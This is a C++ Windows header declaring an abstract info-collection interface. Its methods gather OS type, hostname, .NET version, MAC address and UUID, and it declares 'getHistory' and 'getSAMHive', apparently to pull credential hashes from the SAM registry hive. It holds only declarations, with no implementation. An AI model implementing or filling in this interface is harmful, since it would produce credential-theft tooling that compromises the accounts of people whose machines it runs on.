#ifndef _I_INFO_CLIENT_H
#define _I_INFO_CLIENT_H
#include <map>
#include <string>

#include <string>
#include <map>
#include <stdio.h>
#include <windows.h>
#include <IPHlpApi.h>
#include <assert.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <memory>
#include <io.h>
#include <codecvt>
#include <stdexcept>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "version.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "Advapi32.lib")

class _I_InfoClient {
public:
	enum InfoType {
		OSTYPE,
		HOSTNAME,
		DOTNETVER,
		MACADDR,
		UUID
	};
	
	virtual std::map<_I_InfoClient::InfoType, std::string> routine() = 0;
	virtual std::string getOSType() = 0;
	virtual std::string getHostname() = 0;
	virtual std::string getdotNETver() = 0;
	virtual std::string getMacAddr() = 0;
	virtual std::string getUUID() = 0;
	virtual int getHistory(char **output) = 0;
	virtual int getSAMHive(char **output) = 0;
};

typedef _I_InfoClient* (*_getInstance)();

#endif